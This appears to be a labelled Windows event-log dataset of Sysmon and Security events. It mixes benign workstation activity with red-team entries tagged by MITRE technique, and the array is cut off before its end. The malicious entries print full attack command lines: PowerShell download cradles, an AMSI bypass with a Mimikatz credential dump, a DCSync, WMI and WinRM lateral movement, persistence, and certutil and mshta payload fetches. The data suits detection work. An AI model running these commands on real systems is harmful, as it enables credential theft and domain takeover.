[
  {"Timestamp":"2024-09-12T08:00:01.234Z","EventID":4624,"Provider":"Microsoft-Windows-Security-Auditing","HostName":"WIN-WS01","HostIP":"10.1.10.21","UserName":"CORP\\m.chen","UserSID":"S-1-5-21-3623811015-3361044348-30300820-1143","LogonId":"0x4A2F1","LogonType":"2","SourceIp":"","CommandLine":"","Label":"Benign"},
  {"Timestamp":"2024-09-12T08:00:05.567Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS01","HostIP":"10.1.10.21","ProcessGuid":"{ws01-0001}","ParentProcessGuid":"{ws01-0000}","Image":"C:\\Windows\\System32\\userinit.exe","ParentImage":"C:\\Windows\\System32\\winlogon.exe","CommandLine":"C:\\Windows\\System32\\userinit.exe","UserName":"CORP\\m.chen","Label":"Benign"},
  {"Timestamp":"2024-09-12T08:00:06.789Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS01","HostIP":"10.1.10.21","ProcessGuid":"{ws01-0002}","ParentProcessGuid":"{ws01-0001}","Image":"C:\\Windows\\explorer.exe","ParentImage":"C:\\Windows\\System32\\userinit.exe","CommandLine":"C:\\Windows\\explorer.exe","UserName":"CORP\\m.chen","Label":"Benign"},
  {"Timestamp":"2024-09-12T08:00:15.123Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS01","HostIP":"10.1.10.21","ProcessGuid":"{ws01-0003}","ParentProcessGuid":"{ws01-0002}","Image":"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE","ParentImage":"C:\\Windows\\explorer.exe","CommandLine":"\"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE\"","UserName":"CORP\\m.chen","Label":"Benign"},
  {"Timestamp":"2024-09-12T08:00:18.456Z","EventID":3,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS01","HostIP":"10.1.10.21","ProcessGuid":"{ws01-0003}","Image":"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE","SourceIp":"10.1.10.21","SourcePort":"52100","DestinationIp":"10.1.10.5","DestinationPort":"443","Protocol":"tcp","UserName":"CORP\\m.chen","Label":"Benign"},

  {"Timestamp":"2024-09-12T08:01:00.111Z","EventID":4624,"Provider":"Microsoft-Windows-Security-Auditing","HostName":"WIN-WS02","HostIP":"10.1.10.22","UserName":"CORP\\j.wang","UserSID":"S-1-5-21-3623811015-3361044348-30300820-1155","LogonId":"0x5B3E2","LogonType":"2","SourceIp":"","Label":"Benign"},
  {"Timestamp":"2024-09-12T08:01:05.222Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS02","HostIP":"10.1.10.22","ProcessGuid":"{ws02-0001}","ParentProcessGuid":"{ws02-0000}","Image":"C:\\Windows\\explorer.exe","ParentImage":"C:\\Windows\\System32\\userinit.exe","CommandLine":"C:\\Windows\\explorer.exe","UserName":"CORP\\j.wang","Label":"Benign"},
  {"Timestamp":"2024-09-12T08:01:20.333Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS02","HostIP":"10.1.10.22","ProcessGuid":"{ws02-0002}","ParentProcessGuid":"{ws02-0001}","Image":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","ParentImage":"C:\\Windows\\explorer.exe","CommandLine":"\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\"","UserName":"CORP\\j.wang","Label":"Benign"},
  {"Timestamp":"2024-09-12T08:01:25.444Z","EventID":3,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS02","HostIP":"10.1.10.22","ProcessGuid":"{ws02-0002}","Image":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","SourceIp":"10.1.10.22","SourcePort":"52200","DestinationIp":"142.250.185.206","DestinationPort":"443","Protocol":"tcp","UserName":"CORP\\j.wang","Label":"Benign"},

  {"Timestamp":"2024-09-12T08:02:00.100Z","EventID":4624,"Provider":"Microsoft-Windows-Security-Auditing","HostName":"WIN-WS03","HostIP":"10.1.10.23","UserName":"CORP\\l.zhang","UserSID":"S-1-5-21-3623811015-3361044348-30300820-1160","LogonId":"0x6C4F3","LogonType":"2","SourceIp":"","Label":"Benign"},
  {"Timestamp":"2024-09-12T08:02:05.200Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS03","HostIP":"10.1.10.23","ProcessGuid":"{ws03-0001}","ParentProcessGuid":"{ws03-0000}","Image":"C:\\Windows\\explorer.exe","ParentImage":"C:\\Windows\\System32\\userinit.exe","CommandLine":"C:\\Windows\\explorer.exe","UserName":"CORP\\l.zhang","Label":"Benign"},

  {"Timestamp":"2024-09-12T08:05:00.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-DC01","HostIP":"10.1.10.10","ProcessGuid":"{dc01-0001}","ParentProcessGuid":"{dc01-0000}","Image":"C:\\Windows\\System32\\services.exe","ParentImage":"C:\\Windows\\System32\\wininit.exe","CommandLine":"C:\\Windows\\System32\\services.exe","UserName":"NT AUTHORITY\\SYSTEM","Label":"Benign"},
  {"Timestamp":"2024-09-12T08:05:10.200Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-DC01","HostIP":"10.1.10.10","ProcessGuid":"{dc01-0002}","ParentProcessGuid":"{dc01-0001}","Image":"C:\\Windows\\System32\\svchost.exe","ParentImage":"C:\\Windows\\System32\\services.exe","CommandLine":"C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule","UserName":"NT AUTHORITY\\SYSTEM","Label":"Benign"},
  {"Timestamp":"2024-09-12T08:05:15.300Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-SRV01","HostIP":"10.1.10.30","ProcessGuid":"{srv01-0001}","ParentProcessGuid":"{srv01-0000}","Image":"C:\\Windows\\System32\\svchost.exe","ParentImage":"C:\\Windows\\System32\\services.exe","CommandLine":"C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s wuauserv","UserName":"NT AUTHORITY\\SYSTEM","Label":"Benign"},

  {"Timestamp":"2024-09-12T08:10:00.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS01","HostIP":"10.1.10.21","ProcessGuid":"{ws01-0004}","ParentProcessGuid":"{ws01-0002}","Image":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","ParentImage":"C:\\Windows\\explorer.exe","CommandLine":"\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\m.chen\\Documents\\Q3_Report.docx\"","UserName":"CORP\\m.chen","Label":"Benign"},

  {"Timestamp":"2024-09-12T08:15:30.100Z","EventID":4625,"Provider":"Microsoft-Windows-Security-Auditing","HostName":"WIN-DC01","HostIP":"10.1.10.10","UserName":"CORP\\admin","LogonType":"3","SourceIp":"10.1.10.99","CommandLine":"","Label":"Benign"},
  {"Timestamp":"2024-09-12T08:15:31.200Z","EventID":4625,"Provider":"Microsoft-Windows-Security-Auditing","HostName":"WIN-DC01","HostIP":"10.1.10.10","UserName":"CORP\\administrator","LogonType":"3","SourceIp":"10.1.10.99","CommandLine":"","Label":"Benign"},
  {"Timestamp":"2024-09-12T08:15:32.300Z","EventID":4625,"Provider":"Microsoft-Windows-Security-Auditing","HostName":"WIN-DC01","HostIP":"10.1.10.10","UserName":"CORP\\svc_backup","LogonType":"3","SourceIp":"10.1.10.99","CommandLine":"","Label":"Benign"},

  {"Timestamp":"2024-09-12T08:20:00.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS02","HostIP":"10.1.10.22","ProcessGuid":"{ws02-0003}","ParentProcessGuid":"{ws02-0001}","Image":"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE","ParentImage":"C:\\Windows\\explorer.exe","CommandLine":"\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\" \"C:\\Users\\j.wang\\Downloads\\Invoice_Sept_2024.xlsm\"","UserName":"CORP\\j.wang","Label":"Malicious_RedTeam","MITRE_TechniqueId":"T1204.002","AttackScenario":"Phishing_Macro"},

  {"Timestamp":"2024-09-12T08:20:03.400Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS02","HostIP":"10.1.10.22","ProcessGuid":"{ws02-0004}","ParentProcessGuid":"{ws02-0003}","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentImage":"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE","CommandLine":"powershell.exe -nop -w hidden -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString('https://cdn-update.azurewebsites.net/update.ps1')\"","UserName":"CORP\\j.wang","Hashes":"SHA256=A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2","Label":"Malicious_RedTeam","MITRE_TechniqueId":"T1059.001","AttackScenario":"Phishing_PS_Cradle"},

  {"Timestamp":"2024-09-12T08:20:05.600Z","EventID":3,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS02","HostIP":"10.1.10.22","ProcessGuid":"{ws02-0004}","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","SourceIp":"10.1.10.22","SourcePort":"52301","DestinationIp":"20.54.36.229","DestinationPort":"443","Protocol":"tcp","UserName":"CORP\\j.wang","Label":"Malicious_RedTeam"},

  {"Timestamp":"2024-09-12T08:20:08.800Z","EventID":11,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS02","HostIP":"10.1.10.22","ProcessGuid":"{ws02-0004}","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","TargetObject":"C:\\Users\\j.wang\\AppData\\Local\\Temp\\svchost.exe","ActionType":"FileCreate","UserName":"CORP\\j.wang","Label":"Malicious_RedTeam","MITRE_TechniqueId":"T1036.005"},

  {"Timestamp":"2024-09-12T08:20:10.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS02","HostIP":"10.1.10.22","ProcessGuid":"{ws02-0005}","ParentProcessGuid":"{ws02-0004}","Image":"C:\\Users\\j.wang\\AppData\\Local\\Temp\\svchost.exe","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"C:\\Users\\j.wang\\AppData\\Local\\Temp\\svchost.exe --server 20.54.36.229 --port 443 --interval 60","UserName":"CORP\\j.wang","Hashes":"SHA256=DEADBEEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF01234567","Label":"Malicious_RedTeam","MITRE_TechniqueId":"T1204.002","AttackScenario":"C2_Beacon_Deploy"},

  {"Timestamp":"2024-09-12T08:20:12.300Z","EventID":3,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS02","HostIP":"10.1.10.22","ProcessGuid":"{ws02-0005}","Image":"C:\\Users\\j.wang\\AppData\\Local\\Temp\\svchost.exe","SourceIp":"10.1.10.22","SourcePort":"52310","DestinationIp":"20.54.36.229","DestinationPort":"443","Protocol":"tcp","UserName":"CORP\\j.wang","Label":"Malicious_RedTeam","MITRE_TechniqueId":"T1071.001"},

  {"Timestamp":"2024-09-12T08:25:00.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS01","HostIP":"10.1.10.21","ProcessGuid":"{ws01-0005}","ParentProcessGuid":"{ws01-0002}","Image":"C:\\Windows\\System32\\notepad.exe","ParentImage":"C:\\Windows\\explorer.exe","CommandLine":"notepad.exe C:\\Users\\m.chen\\Documents\\meeting_notes.txt","UserName":"CORP\\m.chen","Label":"Benign"},

  {"Timestamp":"2024-09-12T08:30:00.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS02","HostIP":"10.1.10.22","ProcessGuid":"{ws02-0006}","ParentProcessGuid":"{ws02-0005}","Image":"C:\\Windows\\System32\\cmd.exe","ParentImage":"C:\\Users\\j.wang\\AppData\\Local\\Temp\\svchost.exe","CommandLine":"cmd.exe /c whoami /all","UserName":"CORP\\j.wang","Label":"Malicious_RedTeam","MITRE_TechniqueId":"T1082","AttackScenario":"Recon_Phase1"},
  {"Timestamp":"2024-09-12T08:30:01.200Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS02","HostIP":"10.1.10.22","ProcessGuid":"{ws02-0007}","ParentProcessGuid":"{ws02-0006}","Image":"C:\\Windows\\System32\\whoami.exe","ParentImage":"C:\\Windows\\System32\\cmd.exe","CommandLine":"whoami /all","UserName":"CORP\\j.wang","Label":"Malicious_RedTeam","MITRE_TechniqueId":"T1082"},
  {"Timestamp":"2024-09-12T08:30:05.300Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS02","HostIP":"10.1.10.22","ProcessGuid":"{ws02-0008}","ParentProcessGuid":"{ws02-0005}","Image":"C:\\Windows\\System32\\cmd.exe","ParentImage":"C:\\Users\\j.wang\\AppData\\Local\\Temp\\svchost.exe","CommandLine":"cmd.exe /c ipconfig /all && arp -a && net view","UserName":"CORP\\j.wang","Label":"Malicious_RedTeam","MITRE_TechniqueId":"T1016"},
  {"Timestamp":"2024-09-12T08:30:10.400Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS02","HostIP":"10.1.10.22","ProcessGuid":"{ws02-0009}","ParentProcessGuid":"{ws02-0005}","Image":"C:\\Windows\\System32\\net.exe","ParentImage":"C:\\Users\\j.wang\\AppData\\Local\\Temp\\svchost.exe","CommandLine":"net user /domain","UserName":"CORP\\j.wang","Label":"Malicious_RedTeam","MITRE_TechniqueId":"T1018"},
  {"Timestamp":"2024-09-12T08:30:15.500Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS02","HostIP":"10.1.10.22","ProcessGuid":"{ws02-0010}","ParentProcessGuid":"{ws02-0005}","Image":"C:\\Windows\\System32\\nltest.exe","ParentImage":"C:\\Users\\j.wang\\AppData\\Local\\Temp\\svchost.exe","CommandLine":"nltest /dclist:corp.local /domain_trusts","UserName":"CORP\\j.wang","Label":"Malicious_RedTeam","MITRE_TechniqueId":"T1482"},

  {"Timestamp":"2024-09-12T08:35:00.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS03","HostIP":"10.1.10.23","ProcessGuid":"{ws03-0002}","ParentProcessGuid":"{ws03-0001}","Image":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","ParentImage":"C:\\Windows\\explorer.exe","CommandLine":"\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\l.zhang\\Documents\\Policy_Review.docx\"","UserName":"CORP\\l.zhang","Label":"Benign"},
  {"Timestamp":"2024-09-12T08:36:00.200Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS01","HostIP":"10.1.10.21","ProcessGuid":"{ws01-0006}","ParentProcessGuid":"{ws01-0002}","Image":"C:\\Program Files\\PuTTY\\putty.exe","ParentImage":"C:\\Windows\\explorer.exe","CommandLine":"\"C:\\Program Files\\PuTTY\\putty.exe\" -ssh admin@10.1.10.30","UserName":"CORP\\m.chen","Label":"Benign"},
  {"Timestamp":"2024-09-12T08:36:05.300Z","EventID":3,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS01","HostIP":"10.1.10.21","ProcessGuid":"{ws01-0006}","Image":"C:\\Program Files\\PuTTY\\putty.exe","SourceIp":"10.1.10.21","SourcePort":"52400","DestinationIp":"10.1.10.30","DestinationPort":"22","Protocol":"tcp","UserName":"CORP\\m.chen","Label":"Benign"},

  {"Timestamp":"2024-09-12T08:40:00.100Z","EventID":13,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS02","HostIP":"10.1.10.22","ProcessGuid":"{ws02-0005}","Image":"C:\\Users\\j.wang\\AppData\\Local\\Temp\\svchost.exe","TargetObject":"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsDefenderUpdate","ActionType":"RegistrySetValue","Details":"C:\\Users\\j.wang\\AppData\\Local\\Temp\\svchost.exe --server 20.54.36.229 --port 443 --interval 60","UserName":"CORP\\j.wang","Label":"Malicious_RedTeam","MITRE_TechniqueId":"T1547.001","AttackScenario":"Persistence_RegRun"},

  {"Timestamp":"2024-09-12T08:40:02.300Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS02","HostIP":"10.1.10.22","ProcessGuid":"{ws02-0011}","ParentProcessGuid":"{ws02-0005}","Image":"C:\\Windows\\System32\\schtasks.exe","ParentImage":"C:\\Users\\j.wang\\AppData\\Local\\Temp\\svchost.exe","CommandLine":"schtasks /create /tn \"Microsoft\\Windows\\Defender\\DefenderUpdate\" /tr \"C:\\Users\\j.wang\\AppData\\Local\\Temp\\svchost.exe\" /sc hourly /ru SYSTEM /f","UserName":"CORP\\j.wang","Label":"Malicious_RedTeam","MITRE_TechniqueId":"T1053.005","AttackScenario":"Persistence_SchedTask"},

  {"Timestamp":"2024-09-12T08:45:00.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-SRV01","HostIP":"10.1.10.30","ProcessGuid":"{srv01-0002}","ParentProcessGuid":"{srv01-0001}","Image":"C:\\Windows\\System32\\svchost.exe","ParentImage":"C:\\Windows\\System32\\services.exe","CommandLine":"C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s CryptSvc","UserName":"NT AUTHORITY\\SYSTEM","Label":"Benign"},
  {"Timestamp":"2024-09-12T08:46:00.200Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-DC01","HostIP":"10.1.10.10","ProcessGuid":"{dc01-0003}","ParentProcessGuid":"{dc01-0001}","Image":"C:\\Windows\\System32\\dfsr.exe","ParentImage":"C:\\Windows\\System32\\services.exe","CommandLine":"C:\\Windows\\System32\\dfsr.exe","UserName":"NT AUTHORITY\\SYSTEM","Label":"Benign"},

  {"Timestamp":"2024-09-12T09:00:00.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS02","HostIP":"10.1.10.22","ProcessGuid":"{ws02-0012}","ParentProcessGuid":"{ws02-0005}","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentImage":"C:\\Users\\j.wang\\AppData\\Local\\Temp\\svchost.exe","CommandLine":"powershell.exe -ep bypass -c \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); IEX(New-Object Net.WebClient).DownloadString('https://cdn-update.azurewebsites.net/Invoke-Katz.ps1'); Invoke-Katz -Command 'privilege::debug sekurlsa::logonpasswords exit'\"","UserName":"CORP\\j.wang","Hashes":"SHA256=A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2C3D4E5F6A1B2","Label":"Malicious_RedTeam","MITRE_TechniqueId":"T1003.001","AttackScenario":"Credential_Dump_Mimikatz"},

  {"Timestamp":"2024-09-12T09:00:03.300Z","EventID":10,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS02","HostIP":"10.1.10.22","ProcessGuid":"{ws02-0012}","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","TargetObject":"C:\\Windows\\System32\\lsass.exe","ActionType":"ProcessAccess","UserName":"CORP\\j.wang","Label":"Malicious_RedTeam","MITRE_TechniqueId":"T1003.001"},

  {"Timestamp":"2024-09-12T09:00:05.500Z","EventID":3,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS02","HostIP":"10.1.10.22","ProcessGuid":"{ws02-0012}","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","SourceIp":"10.1.10.22","SourcePort":"52500","DestinationIp":"20.54.36.229","DestinationPort":"443","Protocol":"tcp","UserName":"CORP\\j.wang","Label":"Malicious_RedTeam"},

  {"Timestamp":"2024-09-12T09:05:00.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS01","HostIP":"10.1.10.21","ProcessGuid":"{ws01-0007}","ParentProcessGuid":"{ws01-0002}","Image":"C:\\Program Files\\Microsoft Office\\root\\Office16\\POWERPNT.EXE","ParentImage":"C:\\Windows\\explorer.exe","CommandLine":"\"C:\\Program Files\\Microsoft Office\\root\\Office16\\POWERPNT.EXE\" \"C:\\Users\\m.chen\\Documents\\TeamSync.pptx\"","UserName":"CORP\\m.chen","Label":"Benign"},
  {"Timestamp":"2024-09-12T09:06:00.200Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS03","HostIP":"10.1.10.23","ProcessGuid":"{ws03-0003}","ParentProcessGuid":"{ws03-0001}","Image":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","ParentImage":"C:\\Windows\\explorer.exe","CommandLine":"\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" https://sharepoint.corp.local/sites/hr","UserName":"CORP\\l.zhang","Label":"Benign"},
  {"Timestamp":"2024-09-12T09:06:05.300Z","EventID":3,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS03","HostIP":"10.1.10.23","ProcessGuid":"{ws03-0003}","Image":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","SourceIp":"10.1.10.23","SourcePort":"52600","DestinationIp":"10.1.10.5","DestinationPort":"443","Protocol":"tcp","UserName":"CORP\\l.zhang","Label":"Benign"},

  {"Timestamp":"2024-09-12T09:10:00.100Z","EventID":4624,"Provider":"Microsoft-Windows-Security-Auditing","HostName":"WIN-WS03","HostIP":"10.1.10.23","UserName":"CORP\\j.wang","UserSID":"S-1-5-21-3623811015-3361044348-30300820-1155","LogonId":"0x7D5G4","LogonType":"3","SourceIp":"10.1.10.22","Label":"Malicious_RedTeam","MITRE_TechniqueId":"T1021.002","AttackScenario":"Lateral_SMB"},

  {"Timestamp":"2024-09-12T09:10:05.300Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS02","HostIP":"10.1.10.22","ProcessGuid":"{ws02-0013}","ParentProcessGuid":"{ws02-0005}","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentImage":"C:\\Users\\j.wang\\AppData\\Local\\Temp\\svchost.exe","CommandLine":"powershell.exe -c \"Invoke-Command -ComputerName WIN-WS03 -ScriptBlock { whoami; hostname; ipconfig } -Credential (New-Object PSCredential('CORP\\j.wang',(ConvertTo-SecureString 'P@ssw0rd123' -AsPlainText -Force)))\"","UserName":"CORP\\j.wang","Label":"Malicious_RedTeam","MITRE_TechniqueId":"T1021.006","AttackScenario":"Lateral_WinRM"},
  {"Timestamp":"2024-09-12T09:10:07.500Z","EventID":3,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS02","HostIP":"10.1.10.22","ProcessGuid":"{ws02-0013}","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","SourceIp":"10.1.10.22","SourcePort":"52700","DestinationIp":"10.1.10.23","DestinationPort":"5985","Protocol":"tcp","UserName":"CORP\\j.wang","Label":"Malicious_RedTeam"},

  {"Timestamp":"2024-09-12T09:15:00.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS02","HostIP":"10.1.10.22","ProcessGuid":"{ws02-0014}","ParentProcessGuid":"{ws02-0005}","Image":"C:\\Windows\\System32\\wmic.exe","ParentImage":"C:\\Users\\j.wang\\AppData\\Local\\Temp\\svchost.exe","CommandLine":"wmic /node:WIN-SRV01 process call create \"cmd.exe /c powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('https://cdn-update.azurewebsites.net/update.ps1')\"","UserName":"CORP\\j.wang","Label":"Malicious_RedTeam","MITRE_TechniqueId":"T1047","AttackScenario":"Lateral_WMI"},
  {"Timestamp":"2024-09-12T09:15:02.300Z","EventID":3,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS02","HostIP":"10.1.10.22","ProcessGuid":"{ws02-0014}","Image":"C:\\Windows\\System32\\wmic.exe","SourceIp":"10.1.10.22","SourcePort":"52800","DestinationIp":"10.1.10.30","DestinationPort":"135","Protocol":"tcp","UserName":"CORP\\j.wang","Label":"Malicious_RedTeam"},

  {"Timestamp":"2024-09-12T09:20:00.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS01","HostIP":"10.1.10.21","ProcessGuid":"{ws01-0008}","ParentProcessGuid":"{ws01-0002}","Image":"C:\\Windows\\System32\\mstsc.exe","ParentImage":"C:\\Windows\\explorer.exe","CommandLine":"mstsc.exe /v:WIN-SRV01","UserName":"CORP\\m.chen","Label":"Benign"},
  {"Timestamp":"2024-09-12T09:20:05.200Z","EventID":3,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS01","HostIP":"10.1.10.21","ProcessGuid":"{ws01-0008}","Image":"C:\\Windows\\System32\\mstsc.exe","SourceIp":"10.1.10.21","SourcePort":"52900","DestinationIp":"10.1.10.30","DestinationPort":"3389","Protocol":"tcp","UserName":"CORP\\m.chen","Label":"Benign"},
  {"Timestamp":"2024-09-12T09:21:00.100Z","EventID":4624,"Provider":"Microsoft-Windows-Security-Auditing","HostName":"WIN-SRV01","HostIP":"10.1.10.30","UserName":"CORP\\m.chen","LogonId":"0x8E6H5","LogonType":"10","SourceIp":"10.1.10.21","Label":"Benign"},

  {"Timestamp":"2024-09-12T09:30:00.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS02","HostIP":"10.1.10.22","ProcessGuid":"{ws02-0015}","ParentProcessGuid":"{ws02-0005}","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentImage":"C:\\Users\\j.wang\\AppData\\Local\\Temp\\svchost.exe","CommandLine":"powershell.exe -c \"Invoke-Command -ComputerName WIN-DC01 -ScriptBlock { IEX(New-Object Net.WebClient).DownloadString('https://cdn-update.azurewebsites.net/Invoke-Katz.ps1'); Invoke-Katz -Command 'lsadump::dcsync /domain:corp.local /user:krbtgt' }\"","UserName":"CORP\\j.wang","Label":"Malicious_RedTeam","MITRE_TechniqueId":"T1003.006","AttackScenario":"DCSync_Attack"},
  {"Timestamp":"2024-09-12T09:30:02.300Z","EventID":3,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS02","HostIP":"10.1.10.22","ProcessGuid":"{ws02-0015}","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","SourceIp":"10.1.10.22","SourcePort":"53000","DestinationIp":"10.1.10.10","DestinationPort":"5985","Protocol":"tcp","UserName":"CORP\\j.wang","Label":"Malicious_RedTeam"},

  {"Timestamp":"2024-09-12T09:30:05.500Z","EventID":4662,"Provider":"Microsoft-Windows-Security-Auditing","HostName":"WIN-DC01","HostIP":"10.1.10.10","ProcessGuid":"{dc01-0010}","UserName":"CORP\\j.wang","CommandLine":"","ObjectType":"domainDNS","ObjectGuid":"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2","Properties":"DS-Replication-Get-Changes","AccessMask":"0x100","Label":"Malicious_RedTeam","MITRE_TechniqueId":"T1003.006","AttackScenario":"DCSync_Replication"},
  {"Timestamp":"2024-09-12T09:30:06.600Z","EventID":4662,"Provider":"Microsoft-Windows-Security-Auditing","HostName":"WIN-DC01","HostIP":"10.1.10.10","ProcessGuid":"{dc01-0011}","UserName":"CORP\\j.wang","CommandLine":"","ObjectType":"domainDNS","ObjectGuid":"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2","Properties":"DS-Replication-Get-Changes-All","AccessMask":"0x100","Label":"Malicious_RedTeam","MITRE_TechniqueId":"T1003.006","AttackScenario":"DCSync_Replication"},

  {"Timestamp":"2024-09-12T09:35:00.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS01","HostIP":"10.1.10.21","ProcessGuid":"{ws01-0009}","ParentProcessGuid":"{ws01-0002}","Image":"C:\\Windows\\System32\\svchost.exe","ParentImage":"C:\\Windows\\System32\\services.exe","CommandLine":"C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s BITS","UserName":"NT AUTHORITY\\SYSTEM","Label":"Benign"},

  {"Timestamp":"2024-09-12T09:40:00.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS02","HostIP":"10.1.10.22","ProcessGuid":"{ws02-0016}","ParentProcessGuid":"{ws02-0005}","Image":"C:\\Windows\\System32\\mshta.exe","ParentImage":"C:\\Users\\j.wang\\AppData\\Local\\Temp\\svchost.exe","CommandLine":"mshta.exe javascript:a=GetObject(\"script:https://cdn-update.azurewebsites.net/payload.sct\").Exec()","UserName":"CORP\\j.wang","Label":"Malicious_RedTeam","MITRE_TechniqueId":"T1218.005","AttackScenario":"LOLBAS_MSHTA"},

  {"Timestamp":"2024-09-12T09:45:00.100Z","EventID":1,"Provider":"Microsoft-Windows-Sysmon","HostName":"WIN-WS02","HostIP":"10.1.10.22","ProcessGuid":"{ws02-0017}","ParentProcessGuid":"{ws02-0005}","Image":"C:\\Windows\\System32\\certutil.exe","ParentImage":"C:\\Users\\j.wang\\AppData\\Local\\Temp\\svchost.exe","CommandLine":"certutil.exe -urlcache -split -f https://cdn-update.azurewebsites.net/stage2.dll C:\\Users\\j.wang\\AppData\\Local\\Temp\\mscoree.dll","UserName":"CORP\\j.wang","Label":"Malicious_RedTeam","MITRE_TechniqueId":"T1140","AttackScenario":"Payload_Download_Certutil"},
